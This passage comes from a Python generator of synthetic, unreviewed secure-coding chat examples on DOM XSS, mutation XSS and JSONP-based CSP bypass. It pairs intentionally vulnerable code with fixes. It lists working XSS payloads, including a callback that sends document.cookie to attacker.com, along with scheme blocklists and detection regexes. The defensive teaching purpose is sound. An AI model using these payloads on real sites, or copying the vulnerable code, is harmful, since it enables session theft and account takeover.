        link.textContent = 'Go Home';

        this.contentElement.appendChild(message);
        this.contentElement.appendChild(link);
    }
}

// Initialize secure router
const router = new SecureRouter();

// Additional protection: DOMPurify for any unavoidable HTML
function safelySetHTML(element, htmlString) {
    /**
     * Use DOMPurify when you absolutely must render HTML.
     */
    const clean = DOMPurify.sanitize(htmlString, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p'],
        ALLOWED_ATTR: []
    });
    element.innerHTML = clean;
}
```

**Key Security Controls:**

1. **textContent over innerHTML**: Never use innerHTML with user data
2. **Route Allowlist**: Only predefined routes accepted
3. **Parameter Validation**: Strict patterns for route and param names
4. **Safe DOM APIs**: createElement, setAttribute, textContent
5. **Input Validation**: Length limits and character allowlists
6. **URL Parsing**: Proper decoding with error handling
7. **DOMPurify Fallback**: For cases where HTML is unavoidable

Attack payloads are neutralized because user input never reaches innerHTML or dangerous DOM APIs."""

    user_turn_3 = "What if I need to support dynamic content loaded from an API based on the hash? How do I safely render JSON data?"

    assistant_turn_3 = """When rendering API data based on URL parameters, you need additional validation layers:

```javascript
class SecureRouterWithAPI {
    constructor() {
        this.routes = new Map([
            ['article', { handler: this.renderArticle.bind(this) }],
            ['user', { handler: this.renderUser.bind(this) }],
        ]);

        this.contentElement = document.getElementById('content');
        window.addEventListener('hashchange', () => this.route());
        this.route();
    }

    async route() {
        const hash = this.parseHash();

        if (!hash.route || !this.routes.has(hash.route)) {
            this.render404();
            return;
        }

        const handler = this.routes.get(hash.route).handler;
        await handler(hash.params);
    }

    parseHash() {
        const hash = window.location.hash.slice(1);
        const [route, queryString] = hash.split('?');

        // Validate route
        if (!/^[a-z]+$/.test(route)) {
            return { route: null, params: {} };
        }

        // Parse params
        const params = new URLSearchParams(queryString);
        return { route, params };
    }

    async renderArticle(params) {
        /**
         * Safely render article from API.
         */
        const articleId = params.get('id');

        // Validate article ID (must be numeric)
        if (!/^\\d+$/.test(articleId)) {
            this.renderError('Invalid article ID');
            return;
        }

        try {
            // Fetch from API
            const response = await fetch(`/api/articles/${articleId}`, {
                headers: {
                    'Accept': 'application/json'
                }
            });

            if (!response.ok) {
                throw new Error('Article not found');
            }

            const article = await response.json();

            // Validate response structure
            if (!this.validateArticle(article)) {
                throw new Error('Invalid article data');
            }

            // Render safely
            this.renderArticleContent(article);

        } catch (error) {
            this.renderError('Failed to load article');
        }
    }

    validateArticle(article) {
        /**
         * Validate API response structure.
         */
        if (typeof article !== 'object' || article === null) {
            return false;
        }

        // Required fields with type checking
        if (typeof article.id !== 'number') return false;
        if (typeof article.title !== 'string') return false;
        if (typeof article.content !== 'string') return false;
        if (typeof article.author !== 'string') return false;

        // Length validation
        if (article.title.length > 200) return false;
        if (article.content.length > 50000) return false;

        return true;
    }

    renderArticleContent(article) {
        /**
         * Render article using safe DOM manipulation.
         */
        this.contentElement.textContent = '';

        const container = document.createElement('article');

        // Title (text only)
        const title = document.createElement('h1');
        title.textContent = article.title;  // Safe
        container.appendChild(title);

        // Author (text only)
        const author = document.createElement('p');
        author.className = 'author';
        author.textContent = `By ${article.author}`;  // Safe
        container.appendChild(author);

        // Content (sanitized HTML if needed)
        const content = document.createElement('div');
        content.className = 'article-content';

        // If content contains HTML, sanitize it
        if (article.contentType === 'html') {
            const sanitized = DOMPurify.sanitize(article.content, {
                ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'h2', 'h3', 'ul', 'ol', 'li'],
                ALLOWED_ATTR: [],
                KEEP_CONTENT: true
            });
            content.innerHTML = sanitized;
        } else {
            // Plain text - safest option
            content.textContent = article.content;
        }

        container.appendChild(content);
        this.contentElement.appendChild(container);
    }

    renderUser(params) {
        /**
         * Safely render user profile.
         */
        const username = params.get('username');

        // Validate username format
        if (!/^[a-zA-Z0-9_-]{3,20}$/.test(username)) {
            this.renderError('Invalid username format');
            return;
        }

        // Safe to use in API call (validated)
        fetch(`/api/users/${encodeURIComponent(username)}`)
            .then(response => response.json())
            .then(user => this.renderUserProfile(user))
            .catch(() => this.renderError('User not found'));
    }

    renderUserProfile(user) {
        /**
         * Render user profile with XSS protection.
         */
        this.contentElement.textContent = '';

        const profile = document.createElement('div');
        profile.className = 'user-profile';

        // Username (validated on server)
        const username = document.createElement('h2');
        username.textContent = user.username;
        profile.appendChild(username);

        // Bio (user-generated content - sanitize)
        if (user.bio) {
            const bio = document.createElement('p');
            bio.className = 'bio';
            // Sanitize bio HTML
            bio.innerHTML = DOMPurify.sanitize(user.bio, {
                ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
                ALLOWED_ATTR: []
            });
            profile.appendChild(bio);
        }

        // Avatar (validate URL)
        if (user.avatarUrl && this.isValidImageUrl(user.avatarUrl)) {
            const avatar = document.createElement('img');
            avatar.src = user.avatarUrl;
            avatar.alt = `${user.username}'s avatar`;
            avatar.className = 'avatar';
            profile.appendChild(avatar);
        }

        this.contentElement.appendChild(profile);
    }

    isValidImageUrl(url) {
        /**
         * Validate image URLs to prevent javascript: and data: URLs.
         */
        try {
            const parsed = new URL(url);

            // Only allow https
            if (parsed.protocol !== 'https:') {
                return false;
            }

            // Check file extension
            const validExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp'];
            const hasValidExt = validExtensions.some(ext =>
                parsed.pathname.toLowerCase().endsWith(ext)
            );

            return hasValidExt;
        } catch {
            return false;
        }
    }

    renderError(message) {
        this.contentElement.textContent = '';
        const error = document.createElement('p');
        error.className = 'error';
        error.textContent = message;  // Safe - fixed message
        this.contentElement.appendChild(error);
    }

    render404() {
        this.renderError('Page not found');
    }
}

// Initialize
const router = new SecureRouterWithAPI();
```

**Security Features:**

1. **Input Validation**: Strict patterns for IDs, usernames, etc.
2. **API Response Validation**: Type and structure checking
3. **URL Validation**: Protocol and extension allowlists for images
4. **Safe DOM APIs**: textContent for all user data
5. **DOMPurify**: For unavoidable HTML content
6. **Error Handling**: No user input in error messages
7. **Length Limits**: Prevent abuse with large inputs
8. **Type Checking**: Validate all JSON response types

This prevents DOM XSS even when loading dynamic content from APIs based on URL parameters."""

    return {
        "id": "xss-000038",
        "metadata": create_base_metadata("javascript", 38, "dom_xss"),
        "context": DOM_XSS_CONTEXT,
        "conversations": [
            {"turn": 1, "from": "human", "value": user_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": user_turn_3},
            {"turn": 4, "from": "assistant", "value": assistant_turn_3}
        ],
        "validation": {
            "syntax_check": "not_tested",
            "security_review": "not_reviewed",
            "code_execution": "not_tested",
            "encoding_check": "not_tested",
            "duplication_check": "not_tested",
            "reviewed_by": "automated-generator",
            "review_date": str(date.today()),
            "issues": []
        }
    }


def example_004_mutation_xss_typescript():
    '''TypeScript - Mutation XSS (mXSS) in Content Moderation System'''

    user_turn_1 = "I'm building a content moderation system that sanitizes user HTML before storing it. How do I ensure the HTML stays safe even after additional processing?"

    assistant_turn_1 = """I'll show you how mutation XSS (mXSS) bypasses sanitizers through HTML parsing inconsistencies, then the secure implementation.

**VULNERABLE CODE - DO NOT USE:**

```typescript
import DOMPurify from 'dompurify';

class VulnerableModerationSystem {
    sanitizeContent(userHTML: string): string {
        // Step 1: Sanitize with DOMPurify
        const sanitized = DOMPurify.sanitize(userHTML, {
            ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a'],
            ALLOWED_ATTR: ['href', 'title']
        });

        // DANGER: Additional processing after sanitization
        return this.processHTML(sanitized);
    }

    processHTML(html: string): string {
        // DANGER: Re-parsing and modifying HTML can cause mutations
        // This creates XSS opportunities through parser inconsistencies

        // Example: Remove empty tags
        let processed = html.replace(/<(\\w+)><\\/\\1>/g, '');

        // Example: Normalize attributes (DANGEROUS)
        processed = processed.replace(/href="([^"]*)"/g, (match, url) => {
            return `href="${url.trim()}"`;
        });

        return processed;
    }

    async moderatePost(content: string): Promise<void> {
        const clean = this.sanitizeContent(content);

        // DANGER: Store "sanitized" content that may contain mXSS
        await database.posts.create({
            content: clean,
            approved: true
        });
    }
}
```

**Why This Is Dangerous:**

Mutation XSS exploits differences in how browsers parse HTML:

**Attack Payloads (mXSS):**

```html
<!-- 1. Noscript mXSS -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- After sanitization + re-parsing, becomes: -->
<img src=x onerror=alert(1)>

<!-- 2. Form mXSS -->
<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>

<!-- 3. Namespace confusion -->
<svg><style><![CDATA[</style><img src=x onerror=alert(1)>]]></style></svg>

<!-- 4. Mutation through attribute parsing -->
<a href="&#x6a;avascript:alert(1)">Click</a>
<!-- After normalization, may become: -->
<a href="javascript:alert(1)">Click</a>

<!-- 5. mXSS via comment mutations -->
<div><!-- <script> -->alert(1)<!-- </script> --></div>
```

The payload appears safe after initial sanitization, but re-parsing causes dangerous mutations.

**Real-World Impact:**

__CONTEXT_JSON_PLACEHOLDER__

**SECURE IMPLEMENTATION:**

```typescript
import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

interface SanitizationConfig {
    allowedTags: string[];
    allowedAttributes: Record<string, string[]>;
    allowedProtocols: string[];
}

class SecureModerationSystem {
    private purifyInstance: DOMPurify.DOMPurifyI;
    private config: SanitizationConfig;

    constructor() {
        // Create DOMPurify instance
        const window = new JSDOM('').window;
        this.purifyInstance = DOMPurify(window);

        this.config = {
            allowedTags: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li'],
            allowedAttributes: {
                'a': ['href', 'title']
            },
            allowedProtocols: ['http', 'https', 'mailto']
        };

        // Configure hooks to detect mutations
        this.setupMutationDetection();
    }

    setupMutationDetection(): void {
        /**
         * Add DOMPurify hooks to detect potential mXSS attempts.
         */
        this.purifyInstance.addHook('afterSanitizeAttributes', (node) => {
            // Check for dangerous attribute mutations
            if (node.hasAttribute('href')) {
                const href = node.getAttribute('href') || '';
                const decoded = this.fullyDecodeURI(href);

                // Check if decoding reveals dangerous content
                if (decoded !== href && this.isDangerousURL(decoded)) {
                    node.removeAttribute('href');
                }
            }
        });
    }

    fullyDecodeURI(uri: string): string {
        /**
         * Fully decode URI to detect encoded attacks.
         */
        let decoded = uri;
        let previous = '';

        // Decode until no more changes (prevent double-encoding bypass)
        while (decoded !== previous) {
            previous = decoded;
            try {
                decoded = decodeURIComponent(decoded);
            } catch {
                break; // Invalid encoding
            }
        }

        return decoded;
    }

    isDangerousURL(url: string): boolean {
        /**
         * Check for dangerous URL schemes after full decoding.
         */
        const dangerous = [
            'javascript:',
            'data:',
            'vbscript:',
            'file:',
            'about:'
        ];

        const lower = url.toLowerCase().trim();
        return dangerous.some(scheme => lower.startsWith(scheme));
    }

    sanitizeContent(userHTML: string): string {
        /**
         * Sanitize HTML with mXSS protection.
         * Key: Sanitize AFTER all transformations, not before.
         */

        // Step 1: Pre-sanitization (remove obvious attacks)
        let html = this.preSanitize(userHTML);

        // Step 2: Primary sanitization
        html = this.purifyInstance.sanitize(html, {
            ALLOWED_TAGS: this.config.allowedTags,
            ALLOWED_ATTR: this.config.allowedAttributes,
            ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):)/i,
            KEEP_CONTENT: true,
            RETURN_DOM: false,
            RETURN_DOM_FRAGMENT: false,
            SANITIZE_DOM: true,
            IN_PLACE: false
        });

        // Step 3: If you must process further, re-sanitize after
        if (this.needsProcessing(html)) {
            html = this.safeProcess(html);
            // CRITICAL: Re-sanitize after processing
            html = this.purifyInstance.sanitize(html, {
                ALLOWED_TAGS: this.config.allowedTags,
                ALLOWED_ATTR: this.config.allowedAttributes
            });
        }

        // Step 4: Final validation
        if (!this.validateOutput(html, userHTML)) {
            throw new Error('Content failed mutation detection');
        }

        return html;
    }

    preSanitize(html: string): string {
        /**
         * Remove known mXSS vectors before main sanitization.
         */
        // Remove noscript tags (common mXSS vector)
        html = html.replace(/<noscript[^>]*>.*?<\\/noscript>/gis, '');

        // Remove comments (can cause mutations)
        html = html.replace(/<!--.*?-->/gs, '');

        // Normalize whitespace in tags
        html = html.replace(/<\\s+/g, '<');
        html = html.replace(/\\s+>/g, '>');

        return html;
    }

    needsProcessing(html: string): boolean {
        /**
         * Determine if HTML needs additional processing.
         * Minimize post-sanitization processing to reduce mXSS risk.
         */
        // Only process if absolutely necessary
        return false;  // Prefer no post-processing
    }

    safeProcess(html: string): string {
        /**
         * If you must process HTML after sanitization, do it safely.
         * Use DOM APIs, not string manipulation.
         */
        const dom = new JSDOM(html);
        const document = dom.window.document;

        // Example: Safe DOM manipulation
        const links = document.querySelectorAll('a');
        links.forEach(link => {
            // Add rel attribute via DOM API
            link.setAttribute('rel', 'noopener noreferrer');
        });

        return document.body.innerHTML;
    }

    validateOutput(sanitized: string, original: string): boolean {
        /**
         * Detect potential mXSS by comparing lengths and patterns.
         */

        // Check 1: Sanitized output shouldn't be much longer
        if (sanitized.length > original.length * 1.5) {
            console.error('Suspicious output length increase');
            return false;
        }

        // Check 2: No script tags should appear
        if (/<script[^>]*>/i.test(sanitized)) {
            console.error('Script tag found in sanitized output');
            return false;
        }

        // Check 3: No event handlers
        if (/on\\w+\\s*=/i.test(sanitized)) {
            console.error('Event handler found in sanitized output');
            return false;
        }

        // Check 4: No javascript: URLs after all processing
        if (/javascript:/i.test(sanitized)) {
            console.error('JavaScript URL found in sanitized output');
            return false;
        }

        return true;
    }

    async moderatePost(content: string): Promise<void> {
        try {
            const clean = this.sanitizeContent(content);

            // Store sanitized content
            await database.posts.create({
                content: clean,
                original_content: content,  // Keep original for audit
                sanitized_at: new Date(),
                approved: true
            });
        } catch (error) {
            // Log potential mXSS attempt
            console.error('Content failed sanitization:', error);
            await database.moderationLog.create({
                content: content,
                reason: 'Failed mXSS validation',
                timestamp: new Date()
            });
            throw error;
        }
    }
}

// Usage
const moderator = new SecureModerationSystem();
export default moderator;
```

**Key Security Controls:**

1. **Sanitize After Processing**: Never process HTML after sanitization
2. **Full URI Decoding**: Detect encoded attacks
3. **DOMPurify Hooks**: Monitor for attribute mutations
4. **Output Validation**: Length and pattern checks
5. **Pre-Sanitization**: Remove known mXSS vectors
6. **DOM APIs Over Regex**: Safe manipulation when needed
7. **Audit Trail**: Log suspicious content

The mXSS payloads are blocked because we sanitize after all processing and validate output integrity."""

    user_turn_3 = "How do I safely handle user content that needs to be transformed (like Markdown to HTML) while preventing mXSS?"

    assistant_turn_3 = """When transforming user content (Markdown, BBCode, etc.), sanitize the OUTPUT, not the input:

```typescript
import marked from 'marked';
import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

class SecureContentProcessor {
    private purify: DOMPurify.DOMPurifyI;

    constructor() {
        const window = new JSDOM('').window;
        this.purify = DOMPurify(window);

        // Configure marked to be more restrictive
        marked.setOptions({
            sanitizer: false,  // We'll handle sanitization separately
            headerIds: false,   // Prevent ID injection
            mangle: false       // Don't mangle email addresses
        });
    }

    processMarkdown(markdown: string): string {
        /**
         * Convert Markdown to HTML safely, preventing mXSS.
         */

        // Step 1: Validate input
        if (!markdown || markdown.length > 100000) {
            throw new Error('Invalid markdown input');
        }

        // Step 2: Convert Markdown to HTML
        let html = marked.parse(markdown);

        // Step 3: CRITICAL - Sanitize the OUTPUT
        html = this.purify.sanitize(html, {
            ALLOWED_TAGS: [
                'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
                'p', 'br', 'strong', 'em', 'code', 'pre',
                'ul', 'ol', 'li', 'blockquote', 'a', 'img'
            ],
            ALLOWED_ATTR: {
                'a': ['href', 'title'],
                'img': ['src', 'alt', 'title'],
                'code': ['class']
            },
            ALLOWED_URI_REGEXP: /^(?:https?:|mailto:)/i
        });

        // Step 4: Post-sanitization safety checks
        html = this.addLinkSecurity(html);

        // Step 5: Final validation
        if (!this.isOutputSafe(html)) {
            throw new Error('Content failed safety validation');
        }

        return html;
    }

    addLinkSecurity(html: string): string {
        /**
         * Add security attributes to links using DOM manipulation.
         */
        const dom = new JSDOM(html);
        const document = dom.window.document;

        // Add rel="noopener noreferrer" to all links
        document.querySelectorAll('a').forEach(link => {
            link.setAttribute('rel', 'noopener noreferrer');

            const href = link.getAttribute('href');
            if (href && href.startsWith('http')) {
                link.setAttribute('target', '_blank');
            }
        });

        return document.body.innerHTML;
    }

    isOutputSafe(html: string): boolean {
        /**
         * Validate final output for mXSS indicators.
         */

        const dangerous = [
            /<script/i,
            /on\\w+\\s*=/i,           // Event handlers
            /javascript:/i,
            /data:text\\/html/i,
            /<iframe/i,
            /<embed/i,
            /<object/i
        ];

        return !dangerous.some(pattern => pattern.test(html));
    }

    processBBCode(bbcode: string): string {
        /**
         * Convert BBCode to HTML safely.
         * Always sanitize the converted HTML, not the BBCode.
         */

        // Step 1: Convert BBCode to HTML
        let html = this.convertBBCodeToHTML(bbcode);

        // Step 2: CRITICAL - Sanitize the HTML output
        html = this.purify.sanitize(html, {
            ALLOWED_TAGS: ['b', 'i', 'u', 'p', 'br', 'url', 'img'],
            ALLOWED_ATTR: {
                'a': ['href'],
                'img': ['src', 'alt']
            }
        });

        return html;
    }

    convertBBCodeToHTML(bbcode: string): string {
        /**
         * Simple BBCode parser.
         * Note: Output must be sanitized!
         */
        let html = bbcode;

        // Basic conversions
        html = html.replace(/\\[b\\](.*?)\\[\\/b\\]/gs, '<b>$1</b>');
        html = html.replace(/\\[i\\](.*?)\\[\\/i\\]/gs, '<i>$1</i>');
        html = html.replace(/\\[u\\](.*?)\\[\\/u\\]/gs, '<u>$1</u>');

        // URL conversion (will be sanitized after)
        html = html.replace(
            /\\[url=(.*?)\\](.*?)\\[\\/url\\]/gs,
            '<a href="$1">$2</a>'
        );

        return html;
    }

    processWithTemplating(template: string, data: Record<string, any>): string {
        /**
         * Safe template processing with user data.
         * Escape all user data, sanitize final output.
         */

        // Step 1: Escape all user data
        const escaped: Record<string, string> = {};
        for (const [key, value] of Object.entries(data)) {
            escaped[key] = this.escapeHTML(String(value));
        }

        // Step 2: Replace template variables
        let html = template;
        for (const [key, value] of Object.entries(escaped)) {
            html = html.replace(new RegExp(`{{${key}}}`, 'g'), value);
        }

        // Step 3: Sanitize the final output
        html = this.purify.sanitize(html, {
            ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'br'],
            ALLOWED_ATTR: {}
        });

        return html;
    }

    escapeHTML(text: string): string {
        /**
         * Escape HTML special characters.
         */
        const map: Record<string, string> = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;',
            '/': '&#x2F;'
        };

        return text.replace(/[&<>"'\\/]/g, char => map[char]);
    }
}

// Example usage
const processor = new SecureContentProcessor();

// Safe Markdown processing
app.post('/api/post/markdown', async (req, res) => {
    try {
        const markdown = req.body.content;
        const safeHTML = processor.processMarkdown(markdown);

        await database.posts.create({
            content: safeHTML,
            content_type: 'markdown'
        });

        res.json({ success: true });
    } catch (error) {
        res.status(400).json({ error: 'Invalid content' });
    }
});

export default processor;
```

**Critical mXSS Prevention Principles:**

1. **Sanitize Output, Not Input**: Convert first, then sanitize
2. **Never Re-parse After Sanitization**: Causes mutations
3. **DOM APIs Over String Manipulation**: Safer for transformations
4. **Validate Final Output**: Check for dangerous patterns
5. **Escape User Data in Templates**: Before rendering
6. **Strict Allowlists**: Minimal tags/attributes needed
7. **Security Headers**: Add CSP as final defense layer

This prevents mXSS by ensuring sanitization happens AFTER all transformations, when HTML is in final form."""

    return {
        "id": "xss-000039",
        "metadata": create_base_metadata("typescript", 39, "mutation_xss"),
        "context": MXSS_CONTEXT,
        "conversations": [
            {"turn": 1, "from": "human", "value": user_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": user_turn_3},
            {"turn": 4, "from": "assistant", "value": assistant_turn_3}
        ],
        "validation": {
            "syntax_check": "not_tested",
            "security_review": "not_reviewed",
            "code_execution": "not_tested",
            "encoding_check": "not_tested",
            "duplication_check": "not_tested",
            "reviewed_by": "automated-generator",
            "review_date": str(date.today()),
            "issues": []
        }
    }


def example_005_csp_bypass_javascript():
    '''JavaScript - CSP Bypass via JSONP Endpoint'''

    user_turn_1 = "I've implemented Content Security Policy on my site, but I still have a JSONP endpoint for backwards compatibility. Is this safe?"

    assistant_turn_1 = """I'll show you why JSONP endpoints can bypass CSP protections, enabling XSS despite security headers.

**VULNERABLE CODE - DO NOT USE:**

```javascript
const express = require('express');
const app = express();

// CSP header implemented
app.use((req, res, next) => {
    res.setHeader(
        'Content-Security-Policy',
        "default-src 'self'; script-src 'self'; object-src 'none'"
    );
    next();
});

// DANGER: JSONP endpoint with user-controlled callback
app.get('/api/data', (req, res) => {
    const callback = req.query.callback || 'callback';
    const data = {
        user: 'john',
        role: 'admin'
    };

    // DANGER: User controls the callback function name
    res.setHeader('Content-Type', 'application/javascript');
    res.send(`${callback}(${JSON.stringify(data)})`);
});

// Main page
app.get('/', (req, res) => {
    res.send(`
        <html>
        <head>
            <!-- CSP blocks inline scripts -->
        </head>
        <body>
            <h1>Dashboard</h1>
            <script src="/api/data?callback=processData"></script>
            <script>
                function processData(data) {
                    document.getElementById('info').textContent = data.user;
                }
            </script>
        </body>
        </html>
    `);
});
```

**Why This Is Dangerous:**

JSONP bypasses CSP because the response is served as a script from the same origin:

**Attack Payloads:**

```javascript
// 1. Basic XSS via callback parameter
/api/data?callback=alert(document.domain)//

// Response becomes:
alert(document.domain)//({"user":"john","role":"admin"})

// 2. Data exfiltration
/api/data?callback=fetch('https://attacker.com?c='+document.cookie)//

// 3. Multi-statement attack
/api/data?callback=alert(1);console.log

// 4. Object property access
/api/data?callback=window.location='http://attacker.com'//

// 5. Constructor-based execution
/api/data?callback=constructor.constructor('alert(1)')()//
```

The CSP allows scripts from 'self', and JSONP endpoint is same-origin, so attacks succeed.

**Real-World Impact:**

__CONTEXT_JSON_PLACEHOLDER__

**SECURE IMPLEMENTATION:**

```javascript
const express = require('express');
const crypto = require('crypto');
const app = express();

class SecureAPIHandler {
    constructor() {
        // Remove JSONP support - use CORS instead
        this.allowedOrigins = [
            'https://app.example.com',
            'https://dashboard.example.com'
        ];
    }

    setupCSP(app) {
        /**
         * Strict CSP without unsafe-eval or unsafe-inline.
         */
        app.use((req, res, next) => {
            // Generate nonce for this request
            res.locals.nonce = crypto.randomBytes(16).toString('base64');

            res.setHeader(
                'Content-Security-Policy',
                `default-src 'self'; ` +
                `script-src 'self' 'nonce-${res.locals.nonce}'; ` +
                `style-src 'self' 'nonce-${res.locals.nonce}'; ` +
                `object-src 'none'; ` +
                `base-uri 'self'; ` +
                `frame-ancestors 'none'; ` +
                `upgrade-insecure-requests`
            );

            // Additional security headers
            res.setHeader('X-Content-Type-Options', 'nosniff');
            res.setHeader('X-Frame-Options', 'DENY');
            res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

            next();
        });
    }

    setupCORS(app) {
        /**
         * Use CORS instead of JSONP.
         */
        app.use((req, res, next) => {
            const origin = req.get('origin');

            if (origin && this.allowedOrigins.includes(origin)) {
                res.setHeader('Access-Control-Allow-Origin', origin);
                res.setHeader('Access-Control-Allow-Credentials', 'true');
                res.setHeader('Access-Control-Allow-Methods', 'GET, POST');
                res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
            }

            // Handle preflight
            if (req.method === 'OPTIONS') {
                return res.sendStatus(204);
            }

            next();
        });
    }

    validateOrigin(req) {
        /**
         * Strict origin validation.
         */
        const origin = req.get('origin');
        const referer = req.get('referer');

        // For same-origin requests
        if (!origin && !referer) {
            return true;  // Direct navigation
        }

        // For CORS requests
        if (origin) {
            return this.allowedOrigins.includes(origin);
        }

        // Check referer as fallback
        if (referer) {
            try {
                const url = new URL(referer);
                const refererOrigin = `${url.protocol}//${url.host}`;
                return this.allowedOrigins.includes(refererOrigin);
            } catch {
                return false;
            }
        }

        return false;
    }
}

const secureAPI = new SecureAPIHandler();

// Apply security middleware
secureAPI.setupCSP(app);
secureAPI.setupCORS(app);

// Secure API endpoint - JSON only, no JSONP
app.get('/api/data', (req, res) => {
    // Validate origin
    if (!secureAPI.validateOrigin(req)) {
        return res.status(403).json({ error: 'Forbidden' });
    }

    // Return JSON (not JavaScript)
    res.setHeader('Content-Type', 'application/json');
    res.json({
        user: 'john',
        role: 'admin'
    });
});

// Main page with proper CSP
app.get('/', (req, res) => {
    const nonce = res.locals.nonce;

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Dashboard</title>
        </head>
        <body>
            <h1>Dashboard</h1>
            <div id="info"></div>

            <script nonce="${nonce}">
                // Use fetch instead of JSONP
                fetch('/api/data')
                    .then(response => response.json())
                    .then(data => {
                        document.getElementById('info').textContent = data.user;
                    })
                    .catch(error => {
                        console.error('Failed to load data:', error);
                    });
            </script>
        </body>
        </html>
    `);
});

app.listen(3000);
```

**Key Security Controls:**

1. **Remove JSONP**: Use CORS + fetch instead
2. **Strict CSP**: No unsafe-eval, no unsafe-inline
3. **Nonce-based Scripts**: Only allowed scripts execute
4. **Origin Validation**: Strict allowlist for CORS
5. **JSON Content-Type**: Not application/javascript
6. **Additional Headers**: X-Content-Type-Options, X-Frame-Options
7. **No User Input in Scripts**: Callback parameter removed

Attack payloads are blocked because there's no JSONP endpoint to exploit."""

    assistant_turn_1 = assistant_turn_1.replace("__CONTEXT_JSON_PLACEHOLDER__", json.dumps(CSP_BYPASS_CONTEXT, indent=2))

    user_turn_3 = "What if I absolutely must support legacy clients that only work with JSONP? How can I make it safer?"

    assistant_turn_3 = """If you must support JSONP for legacy clients, implement strict callback validation and separate domains:

```javascript
const express = require('express');
const crypto = require('crypto');

class SecureJSONPHandler {
    constructor() {
        // Very strict callback validation
        this.CALLBACK_PATTERN = /^[a-zA-Z_][a-zA-Z0-9_]{0,63}$/;

        // Predefined allowed callback names (allowlist)
        this.ALLOWED_CALLBACKS = new Set([
            'handleData',
            'processResponse',
            'loadUserInfo',
            'displayResults'
        ]);

        // Rate limiting
        this.rateLimiter = new Map();
    }

    validateCallback(callback) {
        /**
         * Strict callback validation.
         */

        // Must be provided
        if (!callback || typeof callback !== 'string') {
            return null;
        }

        // Length check
        if (callback.length > 64) {
            return null;
        }

        // Pattern validation (alphanumeric + underscore only)
        if (!this.CALLBACK_PATTERN.test(callback)) {
            return null;
        }

        // Allowlist check (most secure)
        if (!this.ALLOWED_CALLBACKS.has(callback)) {
            return null;
        }

        // Additional forbidden patterns
        const forbidden = [
            'eval',
            'alert',
            'prompt',
            'confirm',
            'constructor',
            'location',
            'document',
            'window'
        ];

        const lower = callback.toLowerCase();
        if (forbidden.some(word => lower.includes(word))) {
            return null;
        }

        return callback;
    }

    checkRateLimit(ip) {
        /**
         * Rate limit JSONP requests.
         */
        const now = Date.now();
        const windowMs = 60000; // 1 minute
        const maxRequests = 30;

        if (!this.rateLimiter.has(ip)) {
            this.rateLimiter.set(ip, []);
        }

        const requests = this.rateLimiter.get(ip);

        // Remove old requests
        const recentRequests = requests.filter(time => now - time < windowMs);

        if (recentRequests.length >= maxRequests) {
            return false;
        }

        recentRequests.push(now);
        this.rateLimiter.set(ip, recentRequests);

        return true;
    }

    sanitizeData(data) {
        /**
         * Ensure data doesn't contain executable code.
         */
        const str = JSON.stringify(data);

        // Check for dangerous patterns in data
        const dangerous = [
            '<script',
            'javascript:',
            'onerror=',
            'onload=',
            '</script>'
        ];

        const lower = str.toLowerCase();
        if (dangerous.some(pattern => lower.includes(pattern))) {
            throw new Error('Data contains dangerous content');
        }

        return str;
    }
}

const jsonpHandler = new SecureJSONPHandler();

// JSONP endpoint on separate subdomain (api.example.com)
const jsonpApp = express();

jsonpApp.get('/api/legacy/data', (req, res) => {
    const ip = req.ip;

    // Rate limiting
    if (!jsonpHandler.checkRateLimit(ip)) {
        return res.status(429).send('Too many requests');
    }

    // Validate callback
    const callback = jsonpHandler.validateCallback(req.query.callback);

    if (!callback) {
        // If no valid callback, return JSON
        return res.status(400).json({ error: 'Invalid callback parameter' });
    }

    // Get data (from database, etc.)
    const data = {
        user: 'john',
        role: 'user'  // Never return sensitive data via JSONP
    };

    try {
        // Sanitize data
        const safeData = jsonpHandler.sanitizeData(data);

        // Set security headers for JSONP response
        res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
        res.setHeader('X-Content-Type-Options', 'nosniff');

        // CSP for JSONP domain (very restrictive)
        res.setHeader(
            'Content-Security-Policy',
            "default-src 'none'; script-src 'self'; object-src 'none'"
        );

        // Return JSONP with validated callback
        res.send(`${callback}(${safeData});`);

    } catch (error) {
        res.status(400).json({ error: 'Invalid data' });
    }
});

// Main application on main domain (app.example.com)
const mainApp = express();

mainApp.use((req, res, next) => {
    // Strict CSP on main domain
    res.setHeader(
        'Content-Security-Policy',
        "default-src 'self'; " +
        "script-src 'self' https://api.example.com; " +  // Allow JSONP domain
        "connect-src 'self'; " +
        "object-src 'none'"
    );
    next();
});

mainApp.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Legacy Support</title>
        </head>
        <body>
            <h1>Dashboard (Legacy Mode)</h1>
            <div id="info"></div>

            <script>
                // Define callback in global scope (required for JSONP)
                function handleData(data) {
                    // Safely display data
                    const info = document.getElementById('info');
                    info.textContent = 'User: ' + data.user;
                }

                // Load JSONP script
                const script = document.createElement('script');
                script.src = 'https://api.example.com/api/legacy/data?callback=handleData';
                script.onerror = function() {
                    console.error('Failed to load JSONP data');
                };
                document.head.appendChild(script);
            </script>
        </body>
        </html>
    `);
});

// Run on separate ports/domains
jsonpApp.listen(3001);  // api.example.com
mainApp.listen(3000);   // app.example.com
```

**Mitigation Strategies:**

1. **Callback Allowlist**: Only predefined function names accepted
2. **Strict Pattern Validation**: Alphanumeric + underscore only
